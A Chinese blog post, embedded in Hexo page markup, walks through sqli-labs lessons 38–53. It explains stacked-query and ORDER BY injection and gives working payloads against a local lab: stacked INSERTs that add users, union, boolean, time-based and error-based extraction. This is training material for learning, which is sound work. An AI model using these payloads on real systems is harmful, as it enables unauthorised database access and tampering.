@@ -1,0 +1,1719 @@
+<!DOCTYPE html>
+<html lang="">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="Yoga7xm">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="Yoga7xm">
+    
+    <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content="">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    <title>sqli-lab(38-53) · Yoga7xm&#39;s Blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= "/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= "/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "/assets/human.ico" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >Yoga7xm&#39;s Blog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">sqli-lab(38-53)</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>Yoga7xm's Blog</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            sqli-lab(38-53)
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" target="_blank" rel="noopener" data-tags = "web">web</a>
+    
+        <a class="post-tag" href="javascript:void(0);" target="_blank" rel="noopener" data-tags = "sql注入">sql注入</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">1.7k</span>阅读时长: <span class="post-count reading-time">8 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2018/12/02</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>注入天书的第三阶段，外面雾霾挺大的，继续干活。</p>
+<h2 id="0x01-干活"><a href="#0x01-干活" class="headerlink" title="0x01 干活"></a>0x01 干活</h2><h3 id="Less-38-堆叠注入"><a href="#Less-38-堆叠注入" class="headerlink" title="Less-38(堆叠注入)"></a>Less-38(堆叠注入)</h3><p><strong>1.原理：</strong></p>
+<p>在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。 </p>
+<p> <strong>2.实例：</strong></p>
+<p>假如查询语句为：<code>select * from users;</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users ;</span><br><span class="line">+----+----------+------------+</span><br><span class="line">| id | username | password   |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">|  1 | Dumb     | Dumb       |</span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line">|  3 | Dummy    | p@ssword   |</span><br><span class="line">|  4 | secure   | crappy     |</span><br><span class="line">|  5 | stupid   | stupidity  |</span><br><span class="line">|  6 | superman | genious    |</span><br><span class="line">|  7 | batman   | mob!le     |</span><br><span class="line">|  8 | admin    | 123        |</span><br><span class="line">|  9 | admin1   | admin1     |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">9 rows <span class="keyword">in</span> <span class="built_in">set</span></span><br></pre></td></tr></table></figure>
+
+<p>假如此时将语句改为：<code>select * from users ; create table stacked like users;</code></p>
+<p>然后<code>show tables;</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show tables;</span><br><span class="line">+--------------------+</span><br><span class="line">| Tables_in_security |</span><br><span class="line">+--------------------+</span><br><span class="line">| emails             |</span><br><span class="line">| referers           |</span><br><span class="line">| stacked            |</span><br><span class="line">| uagents            |</span><br><span class="line">| users              |</span><br><span class="line">+--------------------+</span><br><span class="line">5 rows <span class="keyword">in</span> <span class="built_in">set</span></span><br></pre></td></tr></table></figure>
+
+<p>可以发现已经创建了一个<code>stacked</code>的表。</p>
+<p><strong>3.局限性：</strong></p>
+<p>堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到API或者数据库引擎不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。</p>
+<blockquote>
+<p>在我们的web系统中，因为代码只会返回一个查询结果，因此堆栈注入第二个语句以后产生的错误或结果只能被忽略，所以我们在前端是看不到返回结果的。同时在使用堆叠注入之前，我们也是需要知道一些数据库相关信息的，例如表名，列名等信息。 </p>
+</blockquote>
+<p>回到这题好像并没有过滤什么….于是直接联合查询注入。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli/Less-38/?id=1&apos;  and 1=2 union select 1,database(),3--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2018/12/02/sqlila/38.png" alt></p>
+<p>使用堆栈注入：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli/Less-38/?id=1&apos;; insert into  users(id,username,password) values (&apos;20&apos;,&apos;yoga&apos;,&apos;yoga&apos;)--+</span><br></pre></td></tr></table></figure>
+
+<p>打开数据库查看：</p>
+<p><img src="/2018/12/02/sqlila/yoga.png" alt></p>
+<p>已经成功添加！！！</p>
+<h3 id="Less-39"><a href="#Less-39" class="headerlink" title="Less-39"></a>Less-39</h3><p>打开题目，单引号测试发现报错<code>&#39;&#39; LIMIT 0,1&#39;</code>于是猜测并没有单引号闭合，于是直接payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli/Less-39/?id=1 and 1=2 union select 1,(SELECT+GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA=DATABASE()),3</span><br></pre></td></tr></table></figure>
+
+<p>堆栈注入的利用payload与前面类似</p>
+<h3 id="Less-40"><a href="#Less-40" class="headerlink" title="Less-40"></a>Less-40</h3><p>付给参数后，逐个测试，发现是单引号+括号的闭合方式，而且是盲注。</p>
+<p>payload：<code>http://localhost/sqli/Less-40/?id=1&#39;) and 1=1--+</code></p>
+<p>堆栈注入的利用payload与前面类似</p>
+<h3 id="Less-41"><a href="#Less-41" class="headerlink" title="Less-41"></a>Less-41</h3><p>给与参数后，发现是简单的bool盲注类型，</p>
+<p>payload：<code>http://localhost/sqli/Less-41/?id=1 and 1=1</code></p>
+<p>堆栈注入的利用payload与前面类似</p>
+<h3 id="Less-42"><a href="#Less-42" class="headerlink" title="Less-42"></a>Less-42</h3><p>查看源码，部分关键源码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#login.php	</span></span><br><span class="line">$username = mysqli_real_escape_string($con1, $_POST[<span class="string">"login_user"</span>]);</span><br><span class="line">$password = $_POST[<span class="string">"login_password"</span>];</span><br><span class="line"></span><br><span class="line">.........</span><br><span class="line">$sql = <span class="string">"SELECT * FROM users WHERE username='$username' and password='$password'"</span>;</span><br></pre></td></tr></table></figure>
+
+<p>可以发现，在登录界面，并未对传入的<code>$password</code>的值进行处理，于是可以在此进行堆栈注入，insert一个新用户，然后进行登录。<br>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_user=admin&amp;login_password=pass&apos; or 1=1;insert into users (id,username,password) values (&apos;30&apos;,&apos;stacked&apos;,&apos;123&apos;);--+ &amp;mysubmit=Login</span><br></pre></td></tr></table></figure>
+
+<p>然后利用<code>stacked---123</code>成功登录。</p>
+<p><img src="/2018/12/02/sqlila/42.png" alt></p>
+<h3 id="Less-43"><a href="#Less-43" class="headerlink" title="Less-43"></a>Less-43</h3><p>登录进去，界面与#42一样，可能也是对username或password进行堆栈注入添加用户。</p>
+<p>测试时，发现存在回显错误值<code>use near &#39;&#39;1&#39;&#39;)&#39; at line 1</code></p>
+<p>于是payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_user=admin&amp;login_password=1&apos;) or 1=1;insert into users (id,username,password) values (&apos;31&apos;,&apos;stacked&apos;,&apos;123&apos;);--+&amp;mysubmit=Login</span><br></pre></td></tr></table></figure>
+
+<p>查看数据库的值。</p>
+<p><img src="/2018/12/02/sqlila/43.png" alt></p>
+<h3 id="Less-44"><a href="#Less-44" class="headerlink" title="Less-44"></a>Less-44</h3><p>与上面类似，直接给出payload吧</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_user=admin&amp;login_password=1&apos; or 1=1;insert into users (id,username,password) values (&apos;32&apos;,&apos;stacked&apos;,&apos;123&apos;);--+&amp;mysubmit=Login</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2018/12/02/sqlila/44.png" alt></p>
+<h3 id="Less-45"><a href="#Less-45" class="headerlink" title="Less-45"></a>Less-45</h3><p>跟前面一样，直接给出payload吧</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_user=admin&amp;login_password=1&apos;);insert into users (id,username,password) values (&apos;33&apos;,&apos;stacked&apos;,&apos;123&apos;);--+&amp;mysubmit=Login</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2018/12/02/sqlila/45.png" alt></p>
+<h3 id="Less-46-排序注入"><a href="#Less-46-排序注入" class="headerlink" title="Less-46(排序注入)"></a>Less-46(排序注入)</h3><blockquote>
+<p>格式：IF(Condition,A,B)</p>
+<p>意义：当Condition为TRUE时，返回A；当Condition为FALSE时，返回B。</p>
+<p>作用：作为条件语句使用。</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from goods order by <span class="keyword">if</span>(1=1,id,price);</span><br><span class="line">+----+--------+-------+</span><br><span class="line">| id | name   | price |</span><br><span class="line">+----+--------+-------+</span><br><span class="line">|  1 | apple  |    30 |</span><br><span class="line">|  2 | banana |    20 |</span><br><span class="line">|  3 | peach  |    10 |</span><br><span class="line">+----+--------+-------+</span><br><span class="line">3 rows <span class="keyword">in</span> <span class="built_in">set</span></span><br><span class="line"></span><br><span class="line">mysql&gt; select * from goods order by <span class="keyword">if</span>(1=2,id,price);</span><br><span class="line">+----+--------+-------+</span><br><span class="line">| id | name   | price |</span><br><span class="line">+----+--------+-------+</span><br><span class="line">|  3 | peach  |    10 |</span><br><span class="line">|  2 | banana |    20 |</span><br><span class="line">|  1 | apple  |    30 |</span><br><span class="line">+----+--------+-------+</span><br><span class="line">3 rows <span class="keyword">in</span> <span class="built_in">set</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>IFNULL(expr1,expr2)  如果expr1不是NULL，IFNULL()返回expr1，否则它返回expr2 </p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select IFNULL(null,1);</span><br><span class="line">+-------------+</span><br><span class="line">| IFNULL(0,1) |</span><br><span class="line">+-------------+</span><br><span class="line">|           1 |</span><br><span class="line">+-------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span></span><br><span class="line"></span><br><span class="line">mysql&gt; select IFNULL(1,0);</span><br><span class="line">+-------------+</span><br><span class="line">| IFNULL(1,0) |</span><br><span class="line">+-------------+</span><br><span class="line">|           1 |</span><br><span class="line">+-------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>利用regexp()函数进行数据猜解</strong></p>
+<p>1.猜库名：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?order=(select+1+regexp+if(substring(database(),1,1)=0x72,1,0x00))</span><br></pre></td></tr></table></figure>
+
+<p>2.猜表名：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?order=(select+1+regexp+if(substring((select+concat(table_name)from+information_schema.tables+where+table_schema%3ddatabase()+limit+0,1),1,1)=0x67,1,0x00))</span><br></pre></td></tr></table></figure>
+
+<p>3.猜指定表中列名：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?order=(select+1+regexp+if(substring((select+concat(column_name)from+information_schema.columns+where+table_schema%3ddatabase()+and+table_name%3d0x676f6f6473+limit+0,1),1,1)=0x69,1,0x00))</span><br></pre></td></tr></table></figure>
+
+<p>4.猜数据：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?order=(select+1+regexp+if(substring((select password from users+limit+0,1),1,1)=0x69,1,0x00))</span><br></pre></td></tr></table></figure>
+
+<p>假如有回显，可以直接利用万能的xpath报错。</p>
+<p>回到该题，这题有回显值，于是payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli/Less-46/?sort=(updatexml(1,concat(0x7e,(select database()),0x7e),1))</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2018/12/02/sqlila/46.png" alt></p>
+<h3 id="Less-47"><a href="#Less-47" class="headerlink" title="Less-47"></a>Less-47</h3><p>这里跟上面一样，只不是用了单引号闭合，于是payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli/Less-46/?sort=(updatexml(1,concat(0x7e,(select database()),0x7e),1))</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2018/12/02/sqlila/47.png" alt></p>
+<h3 id="Less-48"><a href="#Less-48" class="headerlink" title="Less-48"></a>Less-48</h3><p>这里好像是盲注，没有回显的。所以payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli/Less-48/?sort=(select+1+regexp+if(substring(database(),1,1)=0x73,1,0x00))</span><br></pre></td></tr></table></figure>
+
+<p>也可以用这种方式盲注</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sql/Less-48/?sort=rand(ascii(substr((select database()),1,1))&gt;127)</span><br></pre></td></tr></table></figure>
+
+<h3 id="Less-49"><a href="#Less-49" class="headerlink" title="Less-49"></a>Less-49</h3><p>这个跟上题好像，但是不管怎样测试均为无变化。于是尝试时间盲注，成功</p>
+<p>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli/Less-49/?sort=1&apos; and if(ascii(mid(database(),1,1))=115,sleep(0.1),0)--+</span><br></pre></td></tr></table></figure>
+
+<h3 id="Less-50-堆叠-排序注入"><a href="#Less-50-堆叠-排序注入" class="headerlink" title="Less-50(堆叠+排序注入)"></a>Less-50(堆叠+排序注入)</h3><p>查看源码，部分关键源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users ORDER BY $id"</span>;</span><br><span class="line"><span class="comment">/* execute multi query */</span></span><br><span class="line"><span class="keyword">if</span> (mysqli_multi_query($con1, $sql))</span><br><span class="line">........</span><br></pre></td></tr></table></figure>
+
+<p>由于这里使用了<code>mysqli_multi_query()</code>函数来执行SQL语句，而且这个与<code>mysqli_query()</code>最大的区别是，这个能执行多条语句，而后者只能执行一条。</p>
+<p>所以此时我们可以用之前的堆叠注入。payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli/Less-50/?sort=1;insert into users (id,username,password) values (&apos;34&apos;,&apos;stacked&apos;,&apos;123&apos;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2018/12/02/sqlila/50.png" alt></p>
+<p>可以看出，命令已经成功执行</p>
+<h3 id="Less-51"><a href="#Less-51" class="headerlink" title="Less-51"></a>Less-51</h3><p>这里跟上面一样，只是用单引号进行闭合了，于是payload为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli/Less-51/?sort=1&apos;;insert into users (id,username,password) values (&apos;35&apos;,&apos;stacked&apos;,&apos;123&apos;);--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2018/12/02/sqlila/51.png" alt></p>
+<p>可以发现，命令依旧执行成功了</p>
+<h3 id="Less-52"><a href="#Less-52" class="headerlink" title="Less-52"></a>Less-52</h3><p>与前面一样只是没有回显而已。payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli/Less-52/?sort=1;insert into users (id,username,password) values (&apos;36&apos;,&apos;stacked&apos;,&apos;123&apos;);--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2018/12/02/sqlila/52.png" alt></p>
+<h3 id="Less-53"><a href="#Less-53" class="headerlink" title="Less-53"></a>Less-53</h3><p>这里跟上面#52一样，只不过是加了单引号闭合，于是payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli/Less-53/?sort=1&apos;;insert into users (id,username,password) values (&apos;37&apos;,&apos;stacked&apos;,&apos;123&apos;);--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2018/12/02/sqlila/53.png" alt></p>
+<h2 id="0x02-后记"><a href="#0x02-后记" class="headerlink" title="0x02 后记"></a>0x02 后记</h2><p>今天这段内容主要学习了下，堆叠注入和排序注入，但是在以后的实战里，后者出现的概率较大，而且一般都会出现在搜索框中。所以还是学到了不少。明天将结束SQL天书了。</p>
+<hr>
+<h2 id="0x03-Reference"><a href="#0x03-Reference" class="headerlink" title="0x03 Reference"></a>0x03 Reference</h2><p><a href="http://www.sqlinjection.net/stacked-queries/" target="_blank" rel="noopener">stacked-queries</a></p>
+<p><a href="https://www.secpulse.com/archives/57197.html" target="_blank" rel="noopener">MySQL Order By 注入总结</a></p>
